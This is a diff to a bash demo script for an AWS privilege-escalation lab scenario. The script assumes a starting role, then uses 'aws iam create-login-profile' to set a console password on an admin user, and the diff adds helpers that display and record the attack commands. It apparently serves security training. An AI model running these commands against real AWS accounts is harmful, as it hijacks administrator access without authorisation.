@@ -3,7 +3,6 @@
 # Demo script for iam:CreateLoginProfile privilege escalation
 # This is a ROLE-BASED one-hop scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-004-to-admin-starting-user"
@@ -79,6 +96,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -92,6 +110,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
 
+show_cmd "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-004-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-004-demo-session")
@@ -104,6 +123,7 @@ export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.Sess
 export AWS_REGION=$AWS_REGION
 
 # Verify role identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
@@ -112,6 +132,7 @@ echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 echo -e "${YELLOW}Step 4: Checking if admin user has a login profile${NC}"
 echo "Admin user: $ADMIN_USER_NAME"
 
+show_cmd "aws iam get-login-profile --user-name $ADMIN_USER_NAME"
 if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
     echo -e "${RED}⚠ Admin user already has a login profile${NC}"
     echo -e "${YELLOW}This scenario may have already been run. Run cleanup_attack.sh first.${NC}"
@@ -124,6 +145,7 @@ echo ""
 # Step 5: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
 else
@@ -136,6 +158,7 @@ echo -e "${YELLOW}Step 6: Creating login profile via iam:CreateLoginProfile${NC}
 echo "Creating console password for admin user: $ADMIN_USER_NAME"
 echo "Password: $PASSWORD"
 
+show_attack_cmd "aws iam create-login-profile --user-name $ADMIN_USER_NAME --password \"$PASSWORD\" --no-password-reset-required"
 aws iam create-login-profile \
     --user-name $ADMIN_USER_NAME \
     --password "$PASSWORD" \
@@ -166,6 +189,15 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreateLoginProfile) → $ADMIN_USER_NAME → Admin"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+echo ""
+
 echo -e "${GREEN}Console Login Information:${NC}"
 echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
 echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
